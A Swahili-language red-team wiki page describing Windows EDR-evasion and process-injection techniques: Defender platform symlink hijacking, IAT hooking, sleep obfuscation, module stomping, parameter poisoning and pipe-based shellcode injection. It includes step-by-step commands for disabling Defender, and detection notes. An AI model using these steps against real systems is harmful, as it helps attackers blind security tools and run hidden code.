Huchagua folda ndogo yenye mfuatano wa toleo ulio juu zaidi kwa mpangilio wa lexicographic (kwa mfano, `4.18.25070.5-0`), kisha huanzisha michakato ya service ya Defender kutoka hapo (husasisha njia za service/registry ipasavyo). Uteuzi huu huamini maingizo ya directory, yakiwemo directory reparse points (symlinks). Administrator anaweza kutumia hili kuelekeza Defender kwenye njia ambayo mshambuliaji anaweza kuandika na kufanya DLL sideloading au kutatiza huduma.<sup>[[21]](#references)[[22]](#references)</sup>

Masharti ya awali
- Local Administrator (inahitajika kuunda directories/symlinks chini ya folda ya Platform)
- Uwezo wa kufanya reboot au kuanzisha upya uteuzi wa platform ya Defender (service huanzishwa upya wakati wa kuwasha)
- Zana zilizojengewa ndani tu zinahitajika (`mklink`)

Kwa nini inafanya kazi
- Defender huzuia uandishi ndani ya folda zake yenyewe, lakini uteuzi wake wa platform huamini maingizo ya directory na kuchagua toleo la juu zaidi kwa mpangilio wa lexicographic bila kuthibitisha kuwa lengo linaelekeza kwenye njia iliyolindwa/kuaminika.

Hatua kwa hatua (mfano)
1) Andaa nakala inayoweza kuandikwa ya folda ya sasa ya platform, kwa mfano `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Unda symlink ya saraka ya toleo la juu zaidi ndani ya Platform inayoelekeza kwenye folda yako:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Uteuzi wa trigger (reboot inapendekezwa):
```cmd
shutdown /r /t 0
```
4) Thibitisha kuwa MsMpEng.exe (WinDefend) inaendeshwa kutoka kwenye njia iliyoelekezwa upya:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Unapaswa kuona njia mpya ya process chini ya `C:\TMP\AV\` na usanidi wa service/registry unaoonyesha eneo hilo.

Chaguo za post-exploitation
- DLL sideloading/code execution: Weka/badilisha DLLs ambazo Defender hupakia kutoka kwenye directory ya application yake ili kutekeleza code katika processes za Defender. Tazama sehemu iliyo juu: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Ondoa version-symlink ili njia iliyosanidiwa isitatuliwe wakati wa kuwasha tena, na Defender ishindwe kuanza:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Kumbuka kuwa technique hii yenyewe haitoi privilege escalation; inahitaji haki za admin.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams zinaweza kuhamisha runtime evasion kutoka kwenye C2 implant na kuiweka ndani ya target module yenyewe kwa ku-hook Import Address Table (IAT) yake na kuelekeza API zilizochaguliwa kupitia code ya position-independent (PIC) inayodhibitiwa na mshambuliaji. Hii huongeza evasion zaidi ya API chache zinazotolewa na kits nyingi (k.m., CreateProcessA), na kupanua ulinzi huohuo hadi kwenye BOFs na post-exploitation DLLs.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Mbinu ya jumla
- Weka PIC blob kando ya target module kwa kutumia reflective loader (ikiwa imetangulizwa au kama companion). PIC lazima ijitosheleze na iwe position-independent.
- Host DLL inapopakiwa, pitia IMAGE_IMPORT_DESCRIPTOR yake na urekebishe IAT entries za imports zinazolengwa (k.m., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) ili zielekeze kwenye PIC wrappers nyembamba.
- Kila PIC wrapper hutekeleza evasion kabla ya kufanya tail-call kwa anwani ya API halisi. Evasion za kawaida ni pamoja na:
  - Kuficha/kufunua kumbukumbu kabla na baada ya call (k.m., encrypt maeneo ya beacon, RWX→RX, kubadilisha majina/ruhusa za kurasa), kisha kurejesha hali baada ya call.
  - Call-stack spoofing: tengeneza stack isiyo na shaka na uhamie kwenye API lengwa ili uchanganuzi wa call stack ubaini frames zinazotarajiwa.<sup>[[9]](#references)</sup>
- Ili kuhakikisha utangamano, toa interface ili Aggressor script (au kitu sawa) iweze kusajili API zitakazo-hookiwa kwa Beacon, BOFs na post-ex DLLs.

Kwa nini IAT hooking hapa
- Hufanya kazi kwa code yoyote inayotumia import iliyo-hookiwa, bila kubadilisha code ya tool au kutegemea Beacon ku-proxy API maalum.
- Hushughulikia post-ex DLLs: ku-hook LoadLibrary* hukuwezesha kunasa upakiaji wa modules (k.m., System.Management.Automation.dll, clr.dll) na kutumia masking/stack evasion hizohizo kwenye API calls zake.
- Hurejesha matumizi ya kuaminika ya amri za post-ex zinazozindua process dhidi ya detections zinazotegemea call stack kwa ku-wrap CreateProcessA/W.

Mchoro mdogo wa IAT hook (pseudocode ya x64 C/C++)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Vidokezo
- Tumia patch baada ya relocations/ASLR na kabla ya matumizi ya kwanza ya import. Reflective loaders kama TitanLdr/AceLdr huonyesha hooking wakati wa DllMain ya module iliyopakiwa.
- Weka wrappers ndogo sana na salama kwa PIC; pata API halisi kupitia thamani ya awali ya IAT uliyonasa kabla ya kuipatch au kupitia LdrGetProcedureAddress.
- Tumia mabadiliko ya RW → RX kwa PIC na epuka kuacha kurasa zikiwa writable+executable.

Call-stack spoofing stub
- PIC stubs za mtindo wa Draugr huunda mnyororo wa uongo wa simu (return addresses zinazoelekeza kwenye modules zisizo na madhara) kisha kuhamia kwenye API halisi.
- Hii hushinda detections zinazotarajia stacks za kawaida kutoka Beacon/BOFs kwenda kwenye APIs nyeti.
- Changanya na mbinu za stack cutting/stack stitching ili kuingia ndani ya frames zinazotarajiwa kabla ya prologue ya API.

Ujumuishaji wa kiutendaji
- Ongeza reflective loader mwanzoni mwa post-ex DLLs ili PIC na hooks zianzishe kiotomatiki DLL inapopakiwa.
- Tumia script ya Aggressor kusajili target APIs ili Beacon na BOFs zinufaike kwa uwazi na njia ileile ya evasion bila mabadiliko ya code.

Mazingatio ya Detection/DFIR
- Uadilifu wa IAT: entries zinazotatua kwenda kwenye anwani zisizo za image (heap/anon); ukaguzi wa mara kwa mara wa import pointers.
- Hitilafu za Stack: return addresses zisizomilikiwa na images zilizopakiwa; mabadiliko ya ghafla kwenda kwenye PIC isiyo ya image; ukoo wa RtlUserThreadStart usio thabiti.
- Telemetry ya Loader: writes za ndani ya process kwenye IAT, shughuli za mapema za DllMain zinazorekebisha import thunks, maeneo ya RX yasiyotarajiwa yanayoundwa wakati wa kupakia.
- Kuepuka upakiaji wa Image: ikiwa unahook LoadLibrary*, fuatilia upakiaji unaotiliwa shaka wa assemblies za automation/clr unaohusiana na matukio ya kuficha memory.

Vipengele vya msingi na mifano vinayohusiana
- Reflective loaders zinazotekeleza IAT patching wakati wa upakiaji (mf., TitanLdr, AceLdr)
- Hooks za kuficha memory (mf., simplehook) na PIC ya stack-cutting (stackcutting)
- PIC call-stack spoofing stubs (mf., Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### IAT hooks za wakati wa import kupitia PICO iliyobaki

Ikiwa unadhibiti reflective loader, unaweza kuhook imports **wakati wa** `ProcessImports()` kwa kubadilisha pointer ya `GetProcAddress` ya loader na resolver maalum inayokagua hooks kwanza:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Unda **resident PICO** (persistent PIC object) inayobaki baada ya PIC ya muda ya loader kujifuta.
- Export function ya `setup_hooks()` inayobadilisha import resolver ya loader (mf., `funcs.GetProcAddress = _GetProcAddress`).
- Katika `_GetProcAddress`, ruka ordinal imports na utumie utafutaji wa hook unaotegemea hash kama `__resolve_hook(ror13hash(name))`. Ikiwa hook ipo, irudishe; la sivyo, elekeza ombi kwa `GetProcAddress` halisi.
- Sajili targets za hook wakati wa link kwa entries za Crystal Palace `addhook "MODULE$Func" "hook"`. Hook hubaki halali kwa sababu ipo ndani ya resident PICO.

Hii huwezesha **uelekezaji upya wa IAT wakati wa import** bila kupatch sehemu ya code ya DLL iliyopakiwa baada ya upakiaji.

### Kulazimisha imports zinazoweza kuhookiwa wakati target inatumia PEB-walking

Hooks za wakati wa import hufanya kazi tu ikiwa function ipo kweli kwenye IAT ya target. Ikiwa module inatatua APIs kupitia PEB-walk + hash (bila import entry), lazimisha import halisi ili njia ya `ProcessImports()` ya loader iione:

- Badilisha utatuzi wa export kwa hash (mf., `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) na marejeo ya moja kwa moja kama `&WaitForSingleObject`.
- Compiler huunda IAT entry, inayowezesha interception wakati reflective loader inatatua imports.

### Sleep/idle obfuscation ya mtindo wa Ekko bila kupatch `Sleep()`

Badala ya kupatch `Sleep`, hook **wait/IPC primitives halisi** zinazotumiwa na implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Kwa waits ndefu, zungushia simu hiyo kwa mnyororo wa obfuscation wa mtindo wa Ekko unaosimba image iliyo kwenye memory wakati wa idle:<sup>[[31]](#references)[[27]](#references)</sup>

- Tumia `CreateTimerQueueTimer` kupanga mfululizo wa callbacks zinazoita `NtContinue` zikiwa na frames za `CONTEXT` zilizoundwa mahususi.
- Mnyororo wa kawaida (x64): weka image kuwa `PAGE_READWRITE` → isimba kwa RC4 kupitia `advapi32!SystemFunction032` kwenye image nzima iliyomapishwa → tekeleza wait inayozuia → ifumbue kwa RC4 → **rejesha ruhusa za kila section** kwa kupitia PE sections → toa ishara ya kukamilika.
- `RtlCaptureContext` hutoa template ya `CONTEXT`; inakiliwe kwenye frames nyingi na kuweka registers (`Rip/Rcx/Rdx/R8/R9`) ili kuita kila hatua.

Maelezo ya kiutendaji: rudisha “success” kwa waits ndefu (mf., `WAIT_OBJECT_0`) ili caller iendelee wakati image imefichwa. Muundo huu huficha module dhidi ya scanners wakati wa vipindi vya idle na huepuka signature ya kawaida ya “patched `Sleep()`”.

Mawazo ya Detection (yanayotegemea telemetry)
- Milipuko ya callbacks za `CreateTimerQueueTimer` zinazoelekeza kwenye `NtContinue`.
- `advapi32!SystemFunction032` kutumika kwenye buffers kubwa zilizo contiguous na ukubwa wa image.
- `VirtualProtect` ya range kubwa ikifuatiwa na urejeshaji maalum wa ruhusa za kila section.

### Usajili wa CFG wakati wa runtime kwa sleep-obfuscation gadgets

Kwenye targets zilizo na CFG, jump ya kwanza isiyo ya moja kwa moja kwenda kwenye gadget ya katikati ya function kama `jmp [rbx]` au `jmp rdi` kwa kawaida itasababisha process kucrash kwa `STATUS_STACK_BUFFER_OVERRUN` kwa sababu gadget haipo kwenye metadata ya CFG ya module. Ili kuweka mnyororo wa mtindo wa Ekko/Kraken ukiendelea kufanya kazi ndani ya processes zilizoimarishwa:<sup>[[30]](#references)</sup>

- Sajili kila indirect destination inayotumiwa na mnyororo kupitia `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` na entries za `CFG_CALL_TARGET_VALID`.
- Kwa anwani zilizo ndani ya images zilizopakiwa (`ntdll`, `kernel32`, `advapi32`), `MEMORY_RANGE_ENTRY` lazima ianze kwenye **image base** na ijumuishwe ukubwa wa **image nzima**.
- Kwa maeneo yaliyomapishwa kwa mkono/PIC/stomped, tumia **allocation base** na ukubwa wa allocation badala yake.
- Weka alama si kwa dispatch gadget pekee, bali pia kwa exports zinazoifikia kwa njia isiyo ya moja kwa moja (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls) na sehemu zozote zinazoweza kutekelezwa zinazodhibitiwa na mshambuliaji ambazo zitakuwa indirect targets.

Hii hubadilisha sleep chains za mtindo wa ROP/JOP kutoka “hufanya kazi tu kwenye processes zisizo na CFG” na kuwa primitive inayoweza kutumika tena kwa `explorer.exe`, browsers, `svchost.exe`, na endpoints nyingine zilizocompiliwa kwa `/guard:cf`.

### Stack spoofing salama kwa CET kwa threads zinazolala

Kubadilisha `CONTEXT` nzima kuna kelele nyingi na kunaweza kusababisha hitilafu kwenye mifumo ya CET Shadow Stack kwa sababu `Rip` iliyofanyiwa spoof lazima bado iendane na hardware shadow stack. Muundo salama zaidi wa kuficha sleep ni:<sup>[[30]](#references)</sup>

- Chagua thread nyingine katika process hiyo hiyo na usome mipaka ya stack ya `NT_TIB` / TEB yake (`StackBase`, `StackLimit`) kupitia `NtQueryInformationThread`.
- Hifadhi nakala ya TEB/TIB halisi ya thread ya sasa.
- Nasa context halisi ya thread inayolala kwa kutumia `GetThreadContext`.
- Nakili **`Rip` halisi pekee** kwenye spoof context, huku `Rsp`/hali ya stack iliyofanyiwa spoof ikibaki bila kubadilishwa.
- Wakati wa sleep, nakili `NT_TIB` ya thread ya spoof kwenye TEB ya sasa ili stack walkers zifanye unwind ndani ya eneo halali la stack.
- Baada ya wait kukamilika, rejesha TIB na thread context ya awali.

Hii hudumisha instruction pointer inayolingana na CET huku ikipotosha EDR stack walkers zinazotegemea metadata ya stack ya TEB kuthibitisha unwinds.

### Njia mbadala inayotumia APC: Kraken Mask

Ikiwa dispatch ya timer-queue ina signature inayotambulika sana, mfuatano uleule wa sleep-encrypt-spoof-restore unaweza kutekelezwa kutoka kwa helper thread iliyosimamishwa kwa kutumia APCs zilizopangwa:<sup>[[27]](#references)</sup>

- Unda helper thread yenye `NtTestAlert` kama entrypoint.
- Panga frames/APCs za `CONTEXT` zilizotayarishwa kwa `NtQueueApcThread` na uzitekeleze kwa `NtAlertResumeThread`.
- Hifadhi hali ya mnyororo kwenye heap badala ya helper stack ili kuepuka kuishiwa na thread stack ya kawaida ya 64 KB.
- Tumia `NtSignalAndWaitForSingleObject` kutoa ishara ya start event na kusubiri kwa wakati mmoja.
- Simamisha main thread kabla ya kurejesha TIB/context (`NtSuspendThread` → restore → `NtResumeThread`) ili kupunguza muda wa race ambapo scanner inaweza kuona stack iliyorejeshwa nusu.

Hii hubadilisha signature ya `CreateTimerQueueTimer` + `NtContinue` na kuweka signature ya helper-thread/APC huku ikihifadhi malengo yale yale ya kuficha kwa RC4 na stack-spoofing.

Mawazo ya ziada ya Detection
- `NtSetInformationVirtualMemory` yenye `VmCfgCallTargetInformation` muda mfupi kabla ya sleeps, waits, au APC dispatch.
- `GetThreadContext`/`SetThreadContext` zikitumika pamoja na `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject`, au `ConnectNamedPipe`.
- `NtQueryInformationThread` ikifuatiwa na writes za moja kwa moja kwenye mipaka ya stack ya TEB/TIB ya thread ya sasa.
- Mifululizo ya `NtQueueApcThread`/`NtAlertResumeThread` inayofikia kwa njia isiyo ya moja kwa moja `SystemFunction032`, `VirtualProtect`, au helpers za kurejesha ruhusa za sections.
- Matumizi yanayojirudia ya gadget signatures fupi kama `FF 23` (`jmp [rbx]`) au `FF E7` (`jmp rdi`) kama dispatch pivots ndani ya modules zilizosainiwa.


## Precision Module Stomping

Module stomping hutekeleza payloads kutoka kwenye **sehemu ya `.text` ya DLL ambayo tayari imeomapishwa ndani ya target process** badala ya kuallocate memory ya private inayotambulika kirahisi au kupakia DLL mpya ya kutumika kama sadaka. Target ya overwrite inapaswa kuwa **image iliyopakiwa na inayoungwa mkono na disk** ambayo nafasi yake ya code inaweza kubeba payload bila kuharibu njia za code ambazo process bado inahitaji.<sup>[[1]](#references)[[2]](#references)</sup>

### Kuchagua target kwa uhakika

Module stomping ya moja kwa moja dhidi ya modules za kawaida kama `uxtheme.dll` au `comctl32.dll` si ya kutegemewa: huenda DLL haijapakiwa kwenye remote process, na eneo la code lililo dogo mno litasababisha process kucrash. Mchakato unaotegemewa zaidi ni:

1. Orodhesha modules za target process na uhifadhi **orodha ya include yenye majina pekee** ya DLLs ambazo tayari zimepakiwa.
2. Jenga payload kwanza na urekodi **ukubwa wake halisi kwa byte**.
3. Changanua DLL zinazoweza kuchaguliwa kwenye disk na ulinganishe PE section **`.text` `Misc_VirtualSize`** na ukubwa wa payload. Hili ni muhimu zaidi kuliko ukubwa wa file kwa sababu linaonyesha ukubwa wa executable section **inapomapishwa kwenye memory**.
4. Changanua **Export Address Table (EAT)** na uchague RVA ya function iliyo-exportiwa kama offset ya kuanzia ya stomp.
5. Kokotoa **blast radius**: payload ikizidi mpaka wa function iliyochaguliwa, itafuta exports zilizo jirani na zilizopangwa baada yake kwenye memory.

Helpers za kawaida za recon/uchaguzi zinazoonekana mara nyingi kwenye mazingira halisi:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Vidokezo vya kiutendaji
- Pendelea DLLs **ambazo tayari zimepakuliwa** kwenye process ya mbali ili kuepuka telemetry ya `LoadLibrary`/upakiaji usiotarajiwa wa image.
- Pendelea exports ambazo target application huzitekeleza mara chache; vinginevyo, njia za kawaida za code zinaweza kufikia bytes zilizostompwa kabla au baada ya kuunda thread.
- Implants kubwa mara nyingi huhitaji kubadilisha uingizaji wa shellcode kutoka string literal hadi **byte-array/braced initializer** ili buffer nzima iwakilishwe kwa usahihi kwenye source ya injector.

Mawazo ya utambuzi
- Uandishi wa mbali ndani ya kurasa zinazoweza kutekelezwa na zinazotegemea image (`MEM_IMAGE`, `PAGE_EXECUTE*`) badala ya allocations za kawaida zaidi za private RWX/RX.
- Export entry points ambazo bytes zake za ndani ya memory hazilingani tena na backing file iliyo kwenye disk.
- Remote threads au context pivots zinazoanza kutekelezwa ndani ya export halali ya DLL ambayo bytes zake za mwanzo zimebadilishwa hivi karibuni.
- Mfuatano wa kutiliwa shaka wa `VirtualProtect(Ex)` / `WriteProcessMemory` dhidi ya kurasa za DLL `.text`, ukifuatiwa na uundaji wa thread.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) ni mbinu ya **process-injection / EDR-evasion** inayokwepa njia ya kawaida ya remote write (`VirtualAllocEx` + `WriteProcessMemory`). Badala ya kunakili bytes kwenye target inayoendelea tayari, inatumia ukweli kwamba Windows **hunakili baadhi ya vigezo vya kuanzisha vya `CreateProcessW` hadi kwenye child process** na kuvihifadhi ndani ya `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Carriers zinazoweza kutiwa sumu ambazo zinakiliwa na `CreateProcessW`

Carriers zenye manufaa ni:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (pamoja na `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Vikwazo vya vitendo vya carriers:

- `lpCommandLine` lazima ielekeze kwenye memory inayoweza kuandikwa kwa `CreateProcessW`, na ina kikomo cha **herufi 32,767 za Unicode** ikijumuisha terminator null.
- `lpEnvironment` lazima iwe environment block ya Unicode yenye mifuatano mfululizo ya `NAME=VALUE\0` na inayositishwa kwa `\0` nyingine ya ziada.
- `lpReserved` imehifadhiwa rasmi, kwa hivyo ulinganifu wa `ShellInfo` unapaswa kuchukuliwa kama maelezo ya utekelezaji badala ya mkataba thabiti uliorekodiwa.

Hii hugeuza uundaji wa kawaida wa process kuwa **primitive ya kuhamisha payload**. Operator huunda child process kwa data ya kuanzisha inayodhibitiwa na mshambuliaji na kuiacha Windows ifanye nakala kati ya processes.

### Mtiririko wa utafutaji wa mbali bila remote write APIs

Baada ya child kuundwa, tafuta buffer iliyonakiliwa kwa kutumia primitives za **kusoma pekee**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → pata `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Soma `PEB` ya mbali
3. Fuata `PEB.ProcessParameters`
4. Soma `RTL_USER_PROCESS_PARAMETERS`
5. Tumia pointer iliyochaguliwa:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Mtiririko wa chini kabisa:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Kutekeleza buffer ya parameter iliyonakiliwa

Eneo la parameter lililonakiliwa kwa kawaida huwa `RW`, si la kutekelezeka. Msururu wa kawaida wa P3 ni:

1. Unda process kawaida (bila kuisimamisha)
2. Fanya ukurasa wa parameter uliochaguliwa uweze kutekelezeka kwa kutumia `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Tumia tena handle ya main thread ambayo tayari imerudishwa katika `PROCESS_INFORMATION`
4. Elekeza upya utekelezaji kwa `NtSetContextThread` (`CONTEXT_CONTROL`, andika juu ya `RIP`)

Tofauti na workflows za kawaida za thread hijacking, hili **halihitaji** `SuspendThread` / `ResumeThread`; context inaweza kubadilishwa moja kwa moja kwenye handle ya main thread iliyorejeshwa.

Hili huepuka API kadhaa ambazo hufuatiliwa mara nyingi kwa ajili ya injection:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- mara nyingi pia `SuspendThread` / `ResumeThread`

### Kizuizi cha null-byte na shellcode ya hatua nyingi

Carriers zote tatu ni **data ya string au inayofanana na string**, kwa hivyo payload ghafi yenye `0x00` hukatwa wakati wa uhamishaji. Suluhisho la vitendo ni **first stage isiyo na null** inayounda upya constants wakati wa utekelezaji kisha kupakia second stage yoyote.

Muundo rahisi ni usanisi wa constant unaotumia XOR:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Hii huruhusu hatua ya kwanza kuunda mifuatano kwenye stack, hoja za API, njia za DLL, au kipakiaji cha shellcode cha hatua ya pili bila kuweka byte null kwenye kigezo kinachosafirishwa.

### Miito ya API inayotumia stack kutoka hatua ya kwanza

Hatua ya kwanza inapohitaji kuita API kama `LoadLibraryA`, inaweza:

- kuweka mfuatano/bafa kwenye stack ya mchakato lengwa
- kuhifadhi **nafasi ya shadow ya x64 ya byte 32**
- kuweka `RCX`, `RDX`, `R8`, `R9` kwenye viwango maalum au viashiria vinavyohusiana na `RSP`
- kuhakikisha `RSP` **imepangiliwa kwa byte 16** kabla ya kuita

Hatua ya pili inaweza kisha kunakiliwa kutoka kwenye stack hadi kwenye mgao wa `PAGE_READWRITE`, kubadilishwa kuwa `PAGE_EXECUTE_READ` kwa `VirtualProtect`, na kurukiwa, hivyo kuepuka mgao wa moja kwa moja wa RWX.

### Mawazo ya utambuzi

Fursa nzuri za uchunguzi zilizotajwa na waandishi:

- `VirtualProtectEx` / `NtProtectVirtualMemory` kubadilisha **kurasa za vigezo vya mchakato kuwa zinazoweza kutekelezwa**
- mabadiliko hayo ya ulinzi yakifuatiwa na `SetThreadContext` / `NtSetContextThread`
- usomaji wa mbali wa `PEB` na kisha `RTL_USER_PROCESS_PARAMETERS`
- thamani za `lpCommandLine`, `lpEnvironment`, au `STARTUPINFO.lpReserved` zilizo ndefu au zenye entropy ya juu isiyo ya kawaida wakati wa kuunda mchakato

### Maelezo

- P3 ni **mbinu ya kuhamisha data kati ya michakato**, si primitive kamili ya utekelezaji yenyewe: kigezo kilichonakiliwa bado kinahitaji kubadilishiwa ruhusa za utekelezaji na mbinu ya kuelekeza utekelezaji.
- Waandishi walizingatia `RtlCreateProcessReflection` / Dirty Vanity lakini wakaikataa kwa sababu ndani yake hutumia primitives zenye mashaka kama `NtWriteVirtualMemory` na `NtCreateThreadEx`.

Kwa uwasilishaji wa payload kwenye mchakato **uliopo** wa Windows kupitia maelezo ya thread, kisha utekaji wa anwani ya kurudi ya thread inayosubiri, tazama [Thread Name-Calling and Waiting Thread Hijacking](windows-process-injection-thread-name-calling-waiting-thread-hijacking.md).

## Console STDIN pipe injection

Mchakato mtoto wa console unaoingiliana pia unaweza kutumiwa kama **primitive ya kuhamisha payload**. Injector huelekeza ingizo la kawaida la mtoto kwenye pipe na kutuma alama ikifuatiwa na shellcode. Baada ya programu ya console kusoma data kwenye kumbukumbu yake binafsi, injector hupata bafa hiyo, huifanya iweze kutekelezwa na kuelekeza thread ya mtoto humo. Hii huepuka `VirtualAllocEx` na `WriteProcessMemory`, lakini bado ni process injection badala ya mbinu ya jumla ya kukwepa EDR.<sup>[[41]](#references)</sup>

Licha ya maelezo ya "named-pipe", utekelezaji wa marejeo huita `CreatePipe`, ambayo huunda **anonymous pipe**. Windows hutekeleza anonymous pipes kwa kutumia vitu vya pipe vyenye majina ya kipekee ndani ya mfumo, lakini PoC haichagui njia ya `\\.\pipe\<name>` wala kuita `CreateNamedPipe`. Huunda handles zinazoweza kurithishwa zenye security descriptor chaguomsingi, huweka handle ya kusoma kwenye `STARTUPINFO.hStdInput`, huweka `STARTF_USESTDHANDLES`, na huwasha mtoto mpya huku urithishaji wa handle ukiwa umewezeshwa. Kwa hiyo, PoC hii huwasha console executable iliyotolewa; haiunganishi pipe yake kwenye mchakato uliopo.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Mtiririko wa kazi wa marejeo

Utekelezaji hutumia mlolongo ufuatao:<sup>[[41]](#references)</sup>

1. Unda jozi za anonymous pipe kwa `STDIN` na `STDOUT` za mtoto. Zima urithishaji kwenye handles mbili za upande wa mzazi na ufunge nakala za upande wa mtoto katika mzazi baada ya kuunda mchakato.
2. Washa executable inayoingiliana kama `netsh.exe` au `nslookup.exe` kwa `CREATE_NEW_CONSOLE`. Mtoto hurithi handles za kawaida zilizoelekezwa upya.
3. Tuma safu kamili ya binary ya `rawData` kwa `WriteFile` kupitia handle ya `STDIN` ya upande wa mzazi. Programu ya console hutumia byte hizo na kuacha nakala katika mojawapo ya maeneo yake binafsi yaliyowekwa kwenye kumbukumbu.
4. Chunguza nafasi ya anwani ya mtoto kwa `VirtualQueryEx`, soma maeneo yanayoweza kuwa `MEM_PRIVATE` kwa `ReadProcessMemory`, na utafute alama mwanzoni mwa `rawData`.
5. Badilisha bafa iliyopatikana kuwa `PAGE_EXECUTE_READWRITE` kwa `VirtualProtectEx`.
6. Tambua thread kuu, isitishe, weka `RIP` kuwa `found_address + 0x19` kwa `NtSetContextThread`, kisha uiwashe tena.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Utekelezaji uliotolewa ni maalum kwa x64: hurekebisha `CONTEXT.Rip`, na payload yake iliyopachikwa ni x64 shellcode. `rawData` huanza na alama ya baiti 25, hivyo baiti zinazotekelezeka huanza kwenye offset ya heksadesimali `0x19`. Unapobadilisha payload, hifadhi mpangilio huo au usasishe alama, search vector, ukubwa wa array na execution offset kwa pamoja. Maoni kwenye source pia yanaorodhesha `0x0A`, `0x0D` na `0x1A` kama bad characters. Workflow hii haibadilishi token au privileges za child.<sup>[[41]](#references)</sup>

Kwa mifumo ya kuunda native helpers ndogo na kukompaila payloads, tazama [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## Thread-pool callback DLL injection bila shellcode (DLLParty)

DLLParty hubadilisha thread-pool injection ya mtindo wa PoolParty ili kufanya worker iliyopo kwenye target iite `LoadLibraryA`, badala ya kutekeleza callback stub iliyoingizwa. Mbinu yake ya dispatch ni `TP_DIRECT` completion inayowekwa kwenye I/O completion port ya pool ya target. Hii haipiti ruhusa za process: PoC huita `OpenProcess(PROCESS_ALL_ACCESS)` na inahitaji memory ya target inayoweza kusomwa/kuandikwa, pamoja na handles za worker-factory na completion-port zinazoweza kunakiliwa.<sup>[[46]](#references)[[47]](#references)</sup>

Kwenye Windows x64, worker hupitisha pointer ya `TP_CALLBACK_INSTANCE` iliyohifadhiwa kwenye stack yake kupitia `RCX`, argument ya kwanza ya callback. `LoadLibraryA` hutafsiri pointer hiyo hiyo kama `LPCSTR`. Kwenye njia iliyojaribiwa, `TppWorkerThread` huunda pointer kwenye `RSP+0x178`, huku write yake ya kwanza ya kawaida ndani ya object hiyo ikiwa kwenye `RSP+0x1d0`. Kwa hiyo, path ya DLL yenye null-terminator inayotoshea ndani ya prefix hii ya baiti 0x58 inaweza kuwekwa mwanzoni mwa instance bila kufutwa kabla ya dispatch. Huu ni uchunguzi maalum kwa build husika, si dhamana iliyorekodiwa ya Windows ABI.<sup>[[46]](#references)[[47]](#references)</sup>

Workflow ya marejeo ni:<sup>[[46]](#references)[[47]](#references)</sup>

1. Orodhesha handles za target kwa `NtQuerySystemInformation(SystemHandleInformation)` na utambue `TpWorkerFactory` kwa kuuliza aina za object. Nakili handle ya worker-factory na uulize `WorkerFactoryBasicInformation`; `StartParameter` hutoa `TP_POOL` ya remote. Ruka factories zenye `TotalWorkerCount == 0`.
2. Soma `TP_POOL.CompletionPort` na pitia orodha binafsi ya workers ya pool. Kwenye build ya Windows 10 19045 x64 iliyojaribiwa (`ntdll.dll 10.0.19041.4842`), kichwa chake kiko kwenye `pool+0x60`; kila link iko kwenye `worker+0x10`, hivyo nafasi ya callback-instance kwenye `worker+0x38` ni sawa na `link+0x28`. PoC hukagua pointer alignment, ulinganifu wa links, umiliki wa pool, thread IDs zisizo sifuri, nodes zinazojirudia, na kichwa cha orodha kisichobadilika.
